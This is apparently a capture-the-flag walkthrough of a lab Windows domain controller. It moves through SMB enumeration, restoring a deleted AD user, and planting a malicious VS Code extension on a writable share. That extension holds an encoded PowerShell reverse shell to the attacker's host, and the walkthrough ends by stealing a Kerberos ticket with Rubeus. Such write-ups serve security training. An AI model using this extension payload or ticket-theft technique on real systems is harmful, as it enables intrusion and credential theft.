# Machine info
As is common in real life pentests, you will start the Checkpoint box with credentials for the following account alex.turner / Checkpoint2024!

```python
alex.turner:Checkpoint2024!
```

# Host file setup
```python
❯❯❯ sudo nxc smb 10.129.80.26 --generate-hosts-file /etc/hosts    
SMB         10.129.80.26    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
```

# Enumeration
## Open ports
```python
❯❯❯ nmap -p- --min-rate=2000 -sT -Pn dc01.checkpoint.htb -vv

Nmap scan report for dc01.checkpoint.htb (10.129.80.26)
Host is up, received user-set (0.014s latency).
rDNS record for 10.129.80.26: DC01.checkpoint.htb
Scanned at 2026-10-26 16:48:48 GMT for 98s
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
5985/tcp  open  wsman            syn-ack
9389/tcp  open  adws             syn-ack
49664/tcp open  unknown          syn-ack
49672/tcp open  unknown          syn-ack
49674/tcp open  unknown          syn-ack
49679/tcp open  unknown          syn-ack
49680/tcp open  unknown          syn-ack
49683/tcp open  unknown          syn-ack
49710/tcp open  unknown          syn-ack
49718/tcp open  unknown          syn-ack

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 98.98 seconds
```

## Nmap
```python
❯❯❯ nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -A --min-rate=2000 -Pn -sT dc01.checkpoint.htb    
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-26 16:51 +0000
Nmap scan report for dc01.checkpoint.htb (10.129.80.26)
Host is up (0.013s latency).
rDNS record for 10.129.80.26: DC01.checkpoint.htb

PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-10-26 23:51:30Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb, Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf            .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|11|2012|2016 (88%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (88%), Microsoft Windows 11 24H2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

# SMB (445)

Null auth disabled

Guest account is disabled

But i can try the provided credentials

```python
❯❯❯ nxc smb dc01.checkpoint.htb -u 'alex.turner' -p 'Checkpoint2024!' --smb-timeout 5
SMB         10.129.80.26    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.80.26    445    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024! 
```

As seen here i can auth as `alex.turner`

## Shares
```python
❯❯❯ nxc smb dc01.checkpoint.htb -u 'alex.turner' -p 'Checkpoint2024!' --smb-timeout 5 --shares
SMB         10.129.80.26    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.80.26    445    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024! 
SMB         10.129.80.26    445    DC01             [*] Enumerated shares
SMB         10.129.80.26    445    DC01             Share           Permissions     Remark
SMB         10.129.80.26    445    DC01             -----           -----------     ------
SMB         10.129.80.26    445    DC01             ADMIN$                          Remote Admin
SMB         10.129.80.26    445    DC01             C$                              Default share
SMB         10.129.80.26    445    DC01             DevDrop         READ            VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
SMB         10.129.80.26    445    DC01             IPC$            READ            Remote IPC
SMB         10.129.80.26    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.80.26    445    DC01             SYSVOL          READ            Logon server share 
SMB         10.129.80.26    445    DC01             VMBackups 
```

Read access on a devdrop share, it stores VS code extensions

## Users
```python
❯❯❯ nxc smb dc01.checkpoint.htb -u 'alex.turner' -p 'Checkpoint2024!' --smb-timeout 5 --rid-brute 20000 | grep SidTypeUser | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
Administrator
Guest
krbtgt
DC01$
alex.turner
ryan.brooks
svc_deploy
james.harper
sarah.mitchell
emily.carter
david.reynolds
jessica.coleman
lauren.flores
michael.torres
kevin.patterson
brian.jenkins
megan.perry
max.palmer
```

Ill use `--rid-brute` to also get machine accounts

# Writable objects as `alex.turner`

```python
❯❯❯ bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get writable               

distinguishedName: CN=Deleted Objects,DC=checkpoint,DC=htb
DACL: WRITE

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: OU=Employees,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: CN=Alex Turner,OU=Employees,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: DC=checkpoint.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.checkpoint.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD
```

Some things here are default, but there is also some interesting info

It looks like i can restore the `mark.davies` user, i also have create child on the employees OU, this is likely where i need to restore the user to

Its also very interesting i have WriteDACL on the deleted objects

```python
❯❯❯ bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get children --target 'CN=Deleted Objects,DC=checkpoint,DC=htb'

distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
```

If i check the child nodes on the deleted objects OU, its only mark, so this privilege isnt really interesting

# Restoring `mark.davies` to `Employees` OU

```python
❯❯❯ bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' set restore 'CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb'
[+] CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb has been restored successfully under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
```

Ill use bloodyAD to restore the object

Ill add the user `mark.davies` to the user list

# Compromising `mark.davies`

```python
❯❯❯ nxc smb dc01.checkpoint.htb -u users.txt -p 'Checkpoint2024!' --continue-on-success --smb-timeout 5

SMB         10.129.80.26    445    DC01             [+] checkpoint.htb\mark.davies:Checkpoint2024! 
```

This password also works on `mark.davies`

# Enumeration  as `mark.davies`

```python
❯❯❯ nxc smb dc01.checkpoint.htb -u mark.davies -p 'Checkpoint2024!' --shares  
SMB         10.129.80.26    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.80.26    445    DC01             [+] checkpoint.htb\mark.davies:Checkpoint2024! 
SMB         10.129.80.26    445    DC01             [*] Enumerated shares
SMB         10.129.80.26    445    DC01             Share           Permissions     Remark
SMB         10.129.80.26    445    DC01             -----           -----------     ------
SMB         10.129.80.26    445    DC01             ADMIN$                          Remote Admin
SMB         10.129.80.26    445    DC01             C$                              Default share
SMB         10.129.80.26    445    DC01             DevDrop         READ,WRITE      VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
SMB         10.129.80.26    445    DC01             IPC$            READ            Remote IPC
SMB         10.129.80.26    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.80.26    445    DC01             SYSVOL          READ            Logon server share 
SMB         10.129.80.26    445    DC01             VMBackups 
```

I now have read and write on the DevDrop share

The shares itself is empty, but write access is whats most important

# Malicious .vsix file upload

https://code.visualstudio.com/api/get-started/your-first-extension

https://www.alhamrizvi.in/writeups/malicious-vsix-extensions-via-writable-smb-shares

```python
❯❯❯ penelope -p 1337        
[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.86.128 • 10.10.14.61
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

First ill set a listener

```python
❯❯❯ cat extension.js 
const { execSync } = require('child_process');

function activate(context) {
    execSync('powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANgAxACIALAAxADMAMwA3ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==');
}

function deactivate() {}
module.exports = { activate, deactivate };
```

Ill make a directory called extension, in here ill make the `extension.js` file which contains the reverse shell

```python
❯❯❯ cat package.json 
{
  "name": "evil-ext",
  "displayName": "Evil Extension",
  "version": "0.0.1",
  "publisher": "attacker",
  "engines": { "vscode": "^1.118.0" },
  "activationEvents": ["*"],
  "main": "./extension.js"
}
```

Ill also make a `package.json` file in the same dir

```python
❯❯❯ zip -r evil-ext.vsix extension     
  adding: extension/ (stored 0%)
  adding: extension/package.json (deflated 29%)
  adding: extension/extension.js (deflated 52%)
```

Then ill just zip the directory containing the two files

```python
❯❯❯ smbclient //dc01.checkpoint.htb/DevDrop -U 'mark.davies'%'Checkpoint2024!'
Try "help" to get a list of possible commands.
smb: \> put evil-ext.vsix 
putting file evil-ext.vsix as \evil-ext.vsix (30.9 kB/s) (average 30.9 kB/s)
smb: \> ls
  .                                   D        0  Thu Oct 29 00:35:54 2026
  ..                                  D        0  Sat May  9 15:42:27 2026
  evil-ext.vsix                       A     1390  Thu Oct 29 00:35:54 2026

		10459391 blocks of size 4096. 2466745 blocks available
smb: \> 
```

Then ill plant the file

![](Pasted%20image%2020261028173911.png)

After a second i get a shell!

This shell is running as `ryan.brooks`

# Compromising `ryan.brooks` 

I do no have creds for this user, but i can upload rubeus and get a kirbi then convert that to a TGT

```python
PS C:\Users\ryan.brooks\Desktop> .\Rubeus.exe tgtdeleg /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3 


[*] Action: Request Fake Delegation TGT (current user)

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/DC01.checkpoint.htb'
[+] Kerberos GSS-API initialization success!
[+] Delegation request success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: tKADHXJaQ53n40dMCJlxvBwZcKZ/SDons89Km6rIFwo=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIF1DCCBdCgAwIBBaEDAgEWooIE0DCCBMxhggTIMIIExKADAgEFoRAbDkNIRUNLUE9JTlQuSFRCoiMwIaADAgECoRowGBsGa3JidGd0Gw5DSEVDS1BPSU5ULkhUQqOCBIQwggSAoAMCARKhAwIBAqKCBHIEggRupZmAzPN4Hq6gkrxzXIp/Cczmq+QWBZ4hSOOVhkyZXZzJMKD0Kai4WnSeoHnK+psuS85pE6sLPRLtM9siVuUKYOg4HRYpsEfPzFJX/e9DudRSzg596JMe1QqH8hxNPlvQX/5loC+M6YJJ6PGnyhMxIjnTRB95kQ8L6lh9Lsx9nVp6+CBSVgIoJD7695Xw4tKIk+g6yH8miF7n74pGza9atgqW6ZNoqeMOm1ptpBfUmeMsIBKl1OL+fn+HNz0ZUe/7tim8a94jXMgZ7fTDzKcitFElwV5uLR+1prGrsWkq+BCbToNwrHUFTMZVZu+lZxV6hcZyRPbP6upvsZdneH198PsOWirdOdVgmXelTLiec1C8B0dPHrMd/6DsbhuN1mlsHOOO9+u7yU8EpcgCTl0gaOXsfI3dwB8ILUWOP+oCMsPawAK28HeAhBGnTF7K9ZU5qPQwkzfM+q65MPokJdtwPwCUQVzH1PGAJQDPPmltSqpPbMbhvTq0xIF6dWXtpk45+nMVqrV8EVFixzRnPORoWJrkr0a+gHqDqenYBvIfTg9I/sll6lYR4ApDVlGBXMnIuAjd6cfTlnZbAPYKEzi7wv+6xUJoqx7u5Ila3l+QlPMx4jB+GPb+AcKZdoyFLVqbioHVr4y2pzFUOXwdbYJrUjGrb8EcN24RlVl5BCsS5NxKY+lvShJM1I2HdJvz93FkhSEp9nNMZuwjGnux9sXGG51LrmcrJ/zZE9bxWrTIuSqI7+qBj97pFMka1x/bfxcMyp4CQz9T30evoY1HejtOxpj17EwyEwX+qKDJXC43BU47BcWBlX8JZMYX8GeglX8ORBwh4CWZ6DEXGCYmhxSFmoOYuoTFzcLSsmMKv7iT4KWselKZjHCXtsoxzrZY0BU08h+wGH6IZEhankQ4z/aeuK645r/7Mi+OVZ/r+V3l/BNCWtgD3whcZq3FB0K1uGA4HSRkT/s0GHXBzg6XbC/S2T/U2WfOUMK8QyyKIKqAXB3leDsmGoo2UaDHzpCRl6QG+0FVglbTyF2vR8SzWUSX17a9/AcVHymQXSX2s0hxv874IPQ0iJG2dq/36pDIcAXWMO+5pv6557S5pz3vGBva+aIXW6DGtzbZ1Fsj9y2AJgGhWndDo5x8GR6kUC0wU2Bvcv5U9mJ5rtdyukWzSNmoWKLAM0P8EjD3J+DcPWMQVXjn1htVgMoGxuEIBsFMIhGYpv4aqdkQAsvEgi1JGNHwF0mDnk2W204UsCl57ZXo2i2IT5RXv/xu1D+JnwNoUOt7LygUr2FFte3OiU5xlYmwxVWHhqHX3I0Iexf6SnVbbuMx79dbP5kZE6YeNMByciiDfYJewu6mmulACIm01d0tdLBH5LSQIqeSRFfkjyT3Cfh3z0U7fZlIZZesKYwT+mgvpr089XiDzk0ir0IKG/UtQ+7dXtHb8qg48SW8ic2a2A2X3Nvxrw3tOzIxuPANlhWh4COG7YzLW0gJn0Bq3ICAw4YHq3UXAa//otjb9A7Zo4HvMIHsoAMCAQCigeQEgeF9gd4wgduggdgwgdUwgdKgKzApoAMCARKhIgQg8Shms8dz0FZOAEi+Cz1B0LQCKt/uOGm9ax3g/nlHWwihEBsOQ0hFQ0tQT0lOVC5IVEKiGDAWoAMCAQGhDzANGwtyeWFuLmJyb29rc6MHAwUAYKEAAKURGA8yMDI2MTAyOTAwNDM1M1qmERgPMjAyNjEwMjkxMDQzNTNapxEYDzIwMjYxMTA1MDA0MzUzWqgQGw5DSEVDS1BPSU5ULkhUQqkjMCGgAwIBAqEaMBgbBmtyYnRndBsOQ0hFQ0tQT0lOVC5IVEI=
PS C:\Users\ryan.brooks\Desktop> 
```

Ill get a kirbi

```python
❯❯❯ echo 'doIF1DCCBdCgAwIBBaEDAgEWooIE0DCCBMxhggTIMIIExKADAgEFoRAbDkNIRUNLUE9JTlQuSFRCoiMwIaADAgECoRowGBsGa3JidGd0Gw5DSEVDS1BPSU5ULkhUQqOCBIQwggSAoAMCARKhAwIBAqKCBHIEggRupZmAzPN4Hq6gkrxzXIp/Cczmq+QWBZ4hSOOVhkyZXZzJMKD0Kai4WnSeoHnK+psuS85pE6sLPRLtM9siVuUKYOg4HRYpsEfPzFJX/e9DudRSzg596JMe1QqH8hxNPlvQX/5loC+M6YJJ6PGnyhMxIjnTRB95kQ8L6lh9Lsx9nVp6+CBSVgIoJD7695Xw4tKIk+g6yH8miF7n74pGza9atgqW6ZNoqeMOm1ptpBfUmeMsIBKl1OL+fn+HNz0ZUe/7tim8a94jXMgZ7fTDzKcitFElwV5uLR+1prGrsWkq+BCbToNwrHUFTMZVZu+lZxV6hcZyRPbP6upvsZdneH198PsOWirdOdVgmXelTLiec1C8B0dPHrMd/6DsbhuN1mlsHOOO9+u7yU8EpcgCTl0gaOXsfI3dwB8ILUWOP+oCMsPawAK28HeAhBGnTF7K9ZU5qPQwkzfM+q65MPokJdtwPwCUQVzH1PGAJQDPPmltSqpPbMbhvTq0xIF6dWXtpk45+nMVqrV8EVFixzRnPORoWJrkr0a+gHqDqenYBvIfTg9I/sll6lYR4ApDVlGBXMnIuAjd6cfTlnZbAPYKEzi7wv+6xUJoqx7u5Ila3l+QlPMx4jB+GPb+AcKZdoyFLVqbioHVr4y2pzFUOXwdbYJrUjGrb8EcN24RlVl5BCsS5NxKY+lvShJM1I2HdJvz93FkhSEp9nNMZuwjGnux9sXGG51LrmcrJ/zZE9bxWrTIuSqI7+qBj97pFMka1x/bfxcMyp4CQz9T30evoY1HejtOxpj17EwyEwX+qKDJXC43BU47BcWBlX8JZMYX8GeglX8ORBwh4CWZ6DEXGCYmhxSFmoOYuoTFzcLSsmMKv7iT4KWselKZjHCXtsoxzrZY0BU08h+wGH6IZEhankQ4z/aeuK645r/7Mi+OVZ/r+V3l/BNCWtgD3whcZq3FB0K1uGA4HSRkT/s0GHXBzg6XbC/S2T/U2WfOUMK8QyyKIKqAXB3leDsmGoo2UaDHzpCRl6QG+0FVglbTyF2vR8SzWUSX17a9/AcVHymQXSX2s0hxv874IPQ0iJG2dq/36pDIcAXWMO+5pv6557S5pz3vGBva+aIXW6DGtzbZ1Fsj9y2AJgGhWndDo5x8GR6kUC0wU2Bvcv5U9mJ5rtdyukWzSNmoWKLAM0P8EjD3J+DcPWMQVXjn1htVgMoGxuEIBsFMIhGYpv4aqdkQAsvEgi1JGNHwF0mDnk2W204UsCl57ZXo2i2IT5RXv/xu1D+JnwNoUOt7LygUr2FFte3OiU5xlYmwxVWHhqHX3I0Iexf6SnVbbuMx79dbP5kZE6YeNMByciiDfYJewu6mmulACIm01d0tdLBH5LSQIqeSRFfkjyT3Cfh3z0U7fZlIZZesKYwT+mgvpr089XiDzk0ir0IKG/UtQ+7dXtHb8qg48SW8ic2a2A2X3Nvxrw3tOzIxuPANlhWh4COG7YzLW0gJn0Bq3ICAw4YHq3UXAa//otjb9A7Zo4HvMIHsoAMCAQCigeQEgeF9gd4wgduggdgwgdUwgdKgKzApoAMCARKhIgQg8Shms8dz0FZOAEi+Cz1B0LQCKt/uOGm9ax3g/nlHWwihEBsOQ0hFQ0tQT0lOVC5IVEKiGDAWoAMCAQGhDzANGwtyeWFuLmJyb29rc6MHAwUAYKEAAKURGA8yMDI2MTAyOTAwNDM1M1qmERgPMjAyNjEwMjkxMDQzNTNapxEYDzIwMjYxMTA1MDA0MzUzWqgQGw5DSEVDS1BPSU5ULkhUQqkjMCGgAwIBAqEaMBgbBmtyYnRndBsOQ0hFQ0tQT0lOVC5IVEI=' | base64 -d | tee ryan.brooks.kirbi
```

Ill then put this into a .kirbi file

```python
❯❯❯ ticketConverter.py ryan.brooks.kirbi ryan.brooks.ccache
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done
```

Then ill convert it!

```python
❯❯❯ export KRB5CCNAME=ryan.brooks.ccache

❯❯❯ faketime -f +7h nxc smb dc01.checkpoint.htb --use-kcache                                                      
SMB         dc01.checkpoint.htb 445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         dc01.checkpoint.htb 445    DC01             [+] CHECKPOINT.HTB\ryan.brooks from ccache
```

Then after exporting  it



